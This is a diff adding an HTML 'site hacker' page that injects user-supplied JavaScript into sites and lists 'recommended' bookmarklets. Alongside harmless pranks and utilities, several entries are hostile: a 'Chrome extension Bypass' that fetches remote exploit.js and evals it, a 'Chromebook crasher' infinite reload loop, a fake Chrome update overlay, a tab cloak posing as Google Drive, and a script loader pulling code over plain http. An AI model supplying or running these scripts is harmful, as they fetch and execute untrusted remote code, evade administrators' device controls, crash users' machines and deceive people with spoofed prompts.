@@ -1,0 +1,231 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SITEH@CKER</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        background-color: #121212;
+        color: #ffffff;
+      }
+
+      button {
+        padding: 10px 20px;
+        font-size: 16px;
+        cursor: pointer;
+        border: none;
+        background-color: #4CAF50;
+        color: white;
+        border-radius: 5px;
+        margin-top: 10px;
+      }
+
+      button:hover {
+        background-color: #45a049;
+      }
+
+      input,
+      textarea {
+        padding: 10px;
+        font-size: 16px;
+        width: 300px;
+        margin-top: 20px;
+        background-color: #2c2c2c;
+        color: #ffffff;
+        border: 1px solid #444;
+      }
+
+      iframe {
+        width: 100%;
+        height: calc(100vh - 200px);
+        border: 1px solid #444;
+        margin-top: 20px;
+      }
+
+      .collapsible {
+        background-color: #444;
+        color: #ffffff;
+        cursor: pointer;
+        padding: 10px;
+        width: 100%;
+        border: none;
+        text-align: left;
+        outline: none;
+        font-size: 15px;
+        transition: 0.4s;
+      }
+
+      .active,
+      .collapsible:hover {
+        background-color: #555;
+      }
+
+      .content {
+        padding: 0 18px;
+        display: none;
+        overflow: hidden;
+        background-color: #1e1e1e;
+        color: #ffffff;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>SITEH@CKER V2</h1>
+    <h1>Which site shall we H@CK today?</h1>
+    <input type="text" id="urlInput" placeholder="Enter site URL" />
+    <textarea id="scriptInput" placeholder="Script to inject"></textarea>
+    <button id="openTab">Open New Tab</button>
+    <button id="recommendedScriptsBtn">Show Recommended Scripts</button>
+    <div id="recommendedScripts" style="display:none;">
+      <button class="collapsible">Log a Message</button>
+      <div class="content">
+        <p>console.log('Hello from injected script!');</p>
+      </div>
+      <button class="collapsible">Show Alert</button>
+      <div class="content">
+        <p>alert('This is a recommended alert!');</p>
+      </div>
+      <button class="collapsible">Change Background Color</button>
+      <div class="content">
+        <p>document.body.style.backgroundColor = 'lightblue';</p>
+      </div>
+      <button class="collapsible">Bookmarklet/JavaScript Executor</button>
+      <div class="content">
+        <p> function executeScript() { try { const scriptCode = document.getElementById("xe-script-input").value; const result = eval(scriptCode); console.log("Script executed successfully!"); console.log("Execution result:", result); } catch (error) { console.log("Error executing script: " + error.message); } } const container = document.createElement("div"); container.style.position = "fixed"; container.style.top = "20px"; container.style.right = "20px"; container.style.backgroundColor = "black"; container.style.color = "green"; container.style.border = "2px solid green"; container.style.padding = "10px"; container.style.borderRadius = "10px"; container.style.zIndex = "9999"; const input = document.createElement("textarea"); input.id = "xe-script-input"; input.style.width = "200px"; input.style.height = "100px"; input.placeholder = "Enter your script here..."; const executeButton = document.createElement("button"); executeButton.textContent = "Execute"; executeButton.style.backgroundColor = "green"; executeButton.style.color = "black"; executeButton.style.border = "none"; executeButton.style.padding = "5px 10px"; executeButton.style.marginTop = "5px"; executeButton.style.cursor = "pointer"; executeButton.addEventListener("click", executeScript); container.appendChild(input); container.appendChild(executeButton); document.body.appendChild(container); </p>
+      </div>
+      <button class="collapsible">Spawn My Little Pony Ponies</button>
+      <div class="content">
+        <p> javascript:(function(srcs, cfg) { var cbcount = 1; var callback = function() { --cbcount; if (cbcount === 0) { BrowserPonies.setBaseUrl(cfg.baseurl); if (!BrowserPoniesBaseConfig.loaded) { BrowserPonies.loadConfig(BrowserPoniesBaseConfig); BrowserPoniesBaseConfig.loaded = true; } BrowserPonies.loadConfig(cfg); if (!BrowserPonies.running()) BrowserPonies.start(); } }; if (typeof(BrowserPoniesConfig) === "undefined") { window.BrowserPoniesConfig = {}; } if (typeof(BrowserPoniesBaseConfig) === "undefined") { ++cbcount; BrowserPoniesConfig.onbasecfg = callback; } if (typeof(BrowserPonies) === "undefined") { ++cbcount; BrowserPoniesConfig.oninit = callback; } var node = (document.body || document.documentElement || document.getElementsByTagName('head')[0]); for (var id in srcs) { if (document.getElementById(id)) continue; if (node) { var s = document.createElement('script'); s.type = 'text/javascript'; s.id = id; s.src = srcs[id]; node.appendChild(s); } else { document.write('\u003cscript type="text/javscript" src="'+ srcs[id]+'" id="'+id+'"\u003e\u003c/script\u003e'); } } callback(); })({ "browser-ponies-script": "https://panzi.github.io/Browser-Ponies/browserponies.js", "browser-ponies-config": "https://panzi.github.io/Browser-Ponies/basecfg.js" }, { baseurl: "https://panzi.github.io/Browser-Ponies/", fadeDuration: 500, volume: 1, fps: 25, speed: 3, audioEnabled: false, showFps: false, showLoadProgress: true, speakProbability: 0.1, spawn: { "applejack": 1, "fluttershy": 1, "pinkie pie": 1, "rainbow dash": 1, "rarity": 1, "twilight sparkle": 1 } }); </p>
+      </div>
+      <button class="collapsible">Unblocked Minecraft</button>
+      <div class="content">
+        <p>https://eaglercraft.com/mc/1.8.8/</p>
+      </div>
+      <button class="collapsible">Currupt v2</button>
+      <div class="content">
+        <p>javascript:(function(){ var css = document.createElement("style"); css.type = "text/css"; css.innerHTML = "body { font-family: 'Comic Sans MS', 'Marker Felt', fantasy; color: #ff0000; }"; document.head.appendChild(css); var message = document.createElement("div"); message.style.position = "fixed"; message.style.top = "0"; message.style.left = "0"; message.style.right = "0"; message.style.bottom = "0"; message.style.background = "black"; message.style.color = "white"; message.style.fontSize = "60px"; message.style.fontFamily = "Impact"; message.style.textAlign = "center"; message.style.paddingTop = "200px"; message.innerHTML = "Error: Page has been corrupted"; document.body.appendChild(message); var images = document.getElementsByTagName("img"); for (var i = 0; i < images.length; i++) { images[i].style.animation="imageShift 2s infinite" ; images[i].style.animationTimingFunction="ease-in-out" ; } var elements=document.querySelectorAll("*"); for (var i=0; i < elements.length; i++) { if (elements[i].tagName !="IMG" ) { elements[i].style.animation="spinAndBounce 1s infinite" ; elements[i].style.animationTimingFunction="ease-in-out" ; } } var keyframes="\        @keyframes imageShift {\            0% { transform: translateX(0px); }\            50% { transform: translateX(20px); }\            100% { transform: translateX(0px); }\        }\        @keyframes spinAndBounce {\            0% { transform: rotate(0deg) scale(1); }\            50% { transform: rotate(180deg) scale(1.2); }\            100% { transform: rotate(360deg) scale(1); }\        }\    " ; var style=document.createElement("style"); style.type="text/css" ; style.innerHTML=keyframes; document.head.appendChild(style);})(); </p>
+      </div>
+      <button class="collapsible">Chromebook crasher</button>
+      <div class="content">
+        <p>javascript:alert("Are You Sure?");alert("Use At Your Own Risk");alert("Ready? IF NO RELOAD NOW.");setTimeout(() => {while (true) {while(1)location.reload(1)}}, 1000);</p>
+      </div>
+      <button class="collapsible">adblocker</button>
+      <div class="content">
+        <p>javascript:(function(){ /* Ad-B-Gone: Bookmarklet that removes obnoxious ads from pages */ var selectors = [ /* By ID: */ '#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container', '#sponsored-recommendations', '#around-the-web', '#sponsored-recommendations', '#taboola-content', '#taboola-below-taboola-native-thumbnails', '#inarticle_wrapper_div', '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow', '#right-ads-rail', 'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph', /* By Class: */ '.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement', '.GoogleActiveViewClass', '.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner', '.ad-anchored', '.js_shelf_ads', '.ad-slot', '.antenna', '.xrail-content', '.advertisement__leaderboard', '.ad-leaderboard', '.trc_rbox_outer', '.ks-recommended', '.article-da', 'div.sponsored-stories-component', 'div.addthis-smartlayers', 'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper', 'div.video-placeholder', 'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block', 'div.OUTBRAIN', 'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block', 'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended', 'div.ad-cluster-container', 'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button', '.ads9', '.leaderboards', '.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block', '.sidebar-ads-holder-top', '.ads-one', '.FullPageModal__scroller', '.content-ads-holder', '.widget-area', '.social-buttons', '.ac-player-ph', /* Other: */ 'script', 'iframe', 'video', 'aside#sponsored-recommendations', 'aside[role="banner"]', 'aside', 'amp-ad', 'span[id^=ad_is_]', 'div[class*="indianapolis-optin"]', 'div[id^=google_ads_iframe]', 'div[data-google-query-id]', 'section[data-response]', 'ins.adsbygoogle', 'div[data-google-query-id]', 'div[data-test-id="fullPageSignupModal"]', 'div[data-test-id="giftWrap"]' ]; for(let i in selectors) { let nodesList = document.querySelectorAll(selectors[i]); for(let i = 0; i < nodesList.length; i++) { let el=nodesList[i]; if(el && el.parentNode) el.parentNode.removeChild(el); } }})(); </p>
+      </div>
+      <button class="collapsible">fake update</button>
+      <div class="content">
+        <p>javascript:(function() { var overlay = document.createElement("div"); overlay.style.position = "fixed"; overlay.style.top = "0"; overlay.style.left = "0"; overlay.style.width = "100%"; overlay.style.height = "100%"; overlay.style.background = "#FFFFFF"; overlay.style.opacity = "0.95"; overlay.style.zIndex = "9999999"; var dialog = document.createElement("div"); dialog.style.position = "absolute"; dialog.style.top = "50%"; dialog.style.left = "50%"; dialog.style.transform = "translate(-50%, -50%)"; dialog.style.width = "450px"; dialog.style.padding = "20px"; dialog.style.background = "#FFFFFF"; dialog.style.border = "1px solid #333333"; dialog.style.borderRadius = "5px"; dialog.style.boxShadow = "0 0 10px rgba(0,0,0,0.5)"; dialog.style.zIndex = "99999999"; var title = document.createElement("h1"); title.innerHTML = "Google Chrome Update"; title.style.marginTop = "0"; title.style.textAlign = "center"; dialog.appendChild(title); var message = document.createElement("p"); message.innerHTML = "Your version of Google Chrome is outdated. Please click the button below to update now."; message.style.margin = "20px 0"; message.style.textAlign = "center"; dialog.appendChild(message); var button = document.createElement("button"); button.innerHTML = "Update Now"; button.style.background = "#0078D7"; button.style.border = "none"; button.style.color = "#FFFFFF"; button.style.padding = "10px 20px"; button.style.borderRadius = "5px"; button.style.cursor = "pointer"; button.addEventListener("click", function() { window.location.href = "https://google.com/chrome"; }); dialog.appendChild(button); overlay.appendChild(dialog); document.body.appendChild(overlay); })();</p>
+      </div>
+      <button class="collapsible">Gravity</button>
+      <div class="content">
+        <p>javascript:(function(){ var elements = document.querySelectorAll("*"); var initialPositions = []; for (var i = 0; i < elements.length; i++) { var rect=elements[i].getBoundingClientRect(); initialPositions.push({ x: rect.x, y: rect.y }); } var gravity=0.1; // adjust this value to change gravity strength function fall() { for (var i=0; i < elements.length; i++) { var rect=elements[i].getBoundingClientRect(); elements[i].style.top=rect.y + gravity + "px" ; } } var timer=setInterval(function() { fall(); var screenBottom=window.innerHeight; for (var i=0; i < elements.length; i++) { var rect=elements[i].getBoundingClientRect(); if (rect.bottom>= screenBottom) { elements[i].style.top = initialPositions[i].y + "px"; } } }, 30); // adjust this value to change the animation speed })(); </p>
+      </div>
+      <button class="collapsible">autoclicker</button>
+      <div class="content">
+        <p>javascript:(function(x,y){if(!window.click){window.click=!0,document.body.style.cursor='crosshair';var cps=prompt('Autoclicker CPS: (Under 200 recommended)');if(!cps||isNaN(cps)?(alert(%27You entered something wrong. Try running the script again.%27),end()):alert(%27Autoclicker activated at %27+cps+%27 CPS! Do [ctrl+e] to stop.%27),addEventListener(%27mousemove%27,e=>{x=e.clientX,y=e.clientY}),addEventListener(%27keydown%27,e=>{%27e%27===e.key&&e.ctrlKey&&(alert(%27Autoclicker deactivated! Click the bookmark again to reactivate!%27),end())}),window.click)var int=setInterval(function(){var e=document.elementFromPoint(x,y);e&&e.click()},1e3/cps);function end(){clearInterval(int),window.click=!1,document.body.style.cursor=%27default%27}}})();</p>
+					</div>
+					<button class="collapsible">Chrome extension Bypass</button>
+					<div class="content">
+						<p>javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);</p>
+					</div>
+					<button class="collapsible">Pretend to be google Drive</button>
+					<div class="content">
+						<p>javascript:function gcloak() { var link = document.querySelector("link[rel*='icon']") || document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = 'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png';document.title = 'My Drive - Google Drive';console.log(document.title);document.getElementsByTagName('head')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);</p>
+					</div>
+					<button class="collapsible">katamari</button>
+					<div class="content">
+						<p>javascript:var%20i,s,ss=['http://kathack.com/js/kh.js','http://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js'];for(i=0;i!=ss.length;i++){s=document.createElement('script');s.src=ss[i];document.body.appendChild(s);}void(0);</p>
+					</div>
+				</div>
+				<script>
+        document.getElementById('openTab').addEventListener('click', function() {
+            let url = document.getElementById('urlInput').value;
+            let scriptContent = document.getElementById('scriptInput').value;
+
+            // Add https:// if the user doesn't include it
+            if (!/^https?:\/\//i.test(url)) {
+                url = 'https://' + url;
+            }
+
+            // Open a new tab
+            let newTab = window.open('', '_blank');
+
+            newTab.document.write(`
+                
+					<html>
+						<head>
+							<title>Injected Content</title>
+							<style>
+                        body {
+                            margin: 0;
+                            display: flex;
+                            flex-direction: column;
+                            height: 100vh;
+                            background-color: #121212;
+                            color: #ffffff;
+                        }
+                        iframe {
+                            width: 100%;
+                            height: calc(100vh - 100px);
+                            border: 1px solid #444;
+                        }
+                    </style>
+						</head>
+						<body>
+							<h1>SITEH@CKERV2</h1>
+							<p>Click below to execute your script.</p>
+							<button id="executeJava">Execute Script</button>
+							<iframe id="contentFrame" src="${url}" frameborder="0"></iframe>
+							<script>
+                        document.getElementById('executeJava').addEventListener('click', function() {
+                            try {
+                                // Try executing the script inside the iframe
+                                let iframe = document.getElementById('contentFrame');
+                                iframe.contentWindow.eval(\`${scriptContent}\`);
+                                alert('Script executed inside the iframe.');
+                            } catch (e) {
+                                // If it fails (likely due to cross-origin policy), execute in the current tab
+                                alert('Unable to execute inside the iframe, running on this page instead.');
+                                eval(\`${scriptContent}\`);
+                            }
+                        });
+                    <\/script>
+							</body>
+						</html>
+            `);
+
+            newTab.document.close();
+        });
+
+        // Collapsible button behavior
+        var coll = document.getElementsByClassName("collapsible");
+        for (let i = 0; i < coll.length; i++) {
+            coll[i].addEventListener("click", function() {
+                this.classList.toggle("active");
+                var content = this.nextElementSibling;
+                if (content.style.display === "block") {
+                    content.style.display = "none";
+                } else {
+                    content.style.display = "block";
+                }
+            });
+        }
+
+        // Toggle recommended scripts
+        document.getElementById('recommendedScriptsBtn').addEventListener('click', function() {
+            let recommendedDiv = document.getElementById('recommendedScripts');
+            recommendedDiv.style.display = recommendedDiv.style.display === 'none' ? 'block' : 'none';
+        });
+    
+					</script>
+				</body>
+			</html>
